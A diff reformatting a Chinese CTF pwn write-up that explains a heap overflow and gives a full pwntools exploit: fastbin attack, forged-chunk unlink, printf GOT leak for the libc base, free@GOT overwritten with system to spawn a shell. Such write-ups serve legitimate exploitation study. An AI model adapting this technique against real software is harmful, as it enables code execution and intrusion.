@@ -36,13 +36,14 @@ change函数有溢出点，我们需要得到的是任意地址写 。
 
 得到任意地址写并控制itemlist内容有两种方法可以实现。第一种是利用Fastbin_attack控制内存。因为itemlist上方的地址空间的_IO_FILE文件指针开始字节为0x7f，我们可以错位利用这个0x7f来实现fastbin_attack,paylaod可以这样写
 
-	add(0x60,"aaaa"+'\n')
-	add(0x60,"bbbb"+'\n')
-	remove(1)
-	change(0,0x100,"c"*0x60+p64(0)+p64(0x71)+p64(0x6020ad)+'\n')
-	add(0x60,"dddd"+'\n')
-    add(0x60,data)  ##这里用data覆盖 itemlist内容
-
+```python
+add(0x60,"aaaa"+'\n')
+add(0x60,"bbbb"+'\n')
+remove(1)
+change(0,0x100,"c"*0x60+p64(0)+p64(0x71)+p64(0x6020ad)+'\n')
+add(0x60,"dddd"+'\n')
+add(0x60,data)  ##这里用data覆盖 itemlist内容
+```
     
 
 这样便覆盖了了itemlist的内容。
@@ -54,80 +55,81 @@ change函数有溢出点，我们需要得到的是任意地址写 。
 
 其实就是伪造空闲chunk，利用unlink向后合并，实现可以往自身 chunk - 3*SIZE 的地址写数据，直接附上exp
 
-	from pwn import *
-	context(os='linux', arch='amd64', log_level='debug')
-	p=process("./pwn")
-	elf=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
-	e=ELF("./pwn")
-	def g():
-	    gdb.attach(p)
-	    raw_input()
-	
-	def show():
-	    p.recvuntil("Your choice:")
-	    p.sendline('1')
-	
-	def add(index, data):
-	    p.recvuntil('choice:')
-	    p.sendline('2')
-	    p.recvuntil('name:')
-	    p.sendline(str(index))
-	    p.recvuntil('servant:')
-	    p.send(data)
-	
-	def change(index,length,data):
-	    p.recvuntil('choice:')
-	    p.sendline('3')
-	    p.recvuntil('servant:')
-	    p.sendline(str(index))
-	    p.recvuntil('servant name:')
-	    p.sendline(str(length))
-	    p.recvuntil('the new name of the servnat:')
-	    p.send(data)
-	
-	def remove(index):
-	    p.recvuntil('choice:')
-	    p.sendline('4')
-	    p.recvuntil('servant:')
-	    p.sendline(str(index))
-	
-	
-	
-	
-	add(16,"aaaa"+'\n')
-	add(32,"bbbb"+'\n')
-	add(144,"cccc"+'\n')
-	add(10,"dddd"+'\n')
-	add(16,"/bin/sh"+'\n')
-	
-	change(1,48,p64(0)+p64(0x21)+p64(0x6020d8-8*3)+p64(0x6020d8-8*2)+p64(0x20)+p64(0xa0)+'\n')   ## 伪造chunk
-	remove(2)        ##  触发unlink
-	
-	printf_got=e.got["printf"]
-	
-	change(1,17,p64(0x10)+p64(printf_got)+'\n')  
-	
-	
-	show()    ## 打印printf got表地址，并算出libc基址
-	p.recvuntil("0 : ")
-	libc_addr=u64(p.recv(6).ljust(8,'\x00'))-elf.symbols["printf"]
-	print "libc_addr==="+hex(libc_addr)
-	
-	
-	system_addr=libc_addr+0x46590
-	
-	print "system="+hex(system_addr)
+```python
+from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+p=process("./pwn")
+elf=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
+e=ELF("./pwn")
+def g():
+    gdb.attach(p)
+    raw_input()
 
-	free_got=e.got["free"]
-	
-	change(1,17,p64(0x10)+p64(free_got)+'\n')  ## 修改chunk_0 的mme地址为free got表地址
-	
-	change(0,7,p64(system_addr)+'\n')  ## 往chunk_0 写system地址
-	
-	remove(4) ## 触发system（“/bin/sh”）
-	
-	p.interactive()
+def show():
+    p.recvuntil("Your choice:")
+    p.sendline('1')
 
+def add(index, data):
+    p.recvuntil('choice:')
+    p.sendline('2')
+    p.recvuntil('name:')
+    p.sendline(str(index))
+    p.recvuntil('servant:')
+    p.send(data)
+
+def change(index,length,data):
+    p.recvuntil('choice:')
+    p.sendline('3')
+    p.recvuntil('servant:')
+    p.sendline(str(index))
+    p.recvuntil('servant name:')
+    p.sendline(str(length))
+    p.recvuntil('the new name of the servnat:')
+    p.send(data)
+
+def remove(index):
+    p.recvuntil('choice:')
+    p.sendline('4')
+    p.recvuntil('servant:')
+    p.sendline(str(index))
+
+
+
+
+add(16,"aaaa"+'\n')
+add(32,"bbbb"+'\n')
+add(144,"cccc"+'\n')
+add(10,"dddd"+'\n')
+add(16,"/bin/sh"+'\n')
+
+change(1,48,p64(0)+p64(0x21)+p64(0x6020d8-8*3)+p64(0x6020d8-8*2)+p64(0x20)+p64(0xa0)+'\n')   ## 伪造chunk
+remove(2)        ##  触发unlink
+
+printf_got=e.got["printf"]
+
+change(1,17,p64(0x10)+p64(printf_got)+'\n')  
+
+
+show()    ## 打印printf got表地址，并算出libc基址
+p.recvuntil("0 : ")
+libc_addr=u64(p.recv(6).ljust(8,'\x00'))-elf.symbols["printf"]
+print "libc_addr==="+hex(libc_addr)
+
+
+system_addr=libc_addr+0x46590
+
+print "system="+hex(system_addr)
+
+free_got=e.got["free"]
+
+change(1,17,p64(0x10)+p64(free_got)+'\n')  ## 修改chunk_0 的mme地址为free got表地址
+
+change(0,7,p64(system_addr)+'\n')  ## 往chunk_0 写system地址
+
+remove(4) ## 触发system（“/bin/sh”）
+
+p.interactive()
+```
 
 >[相关资料](https://sirhc.xyz/2018/07/23/heap-unlink/)
 
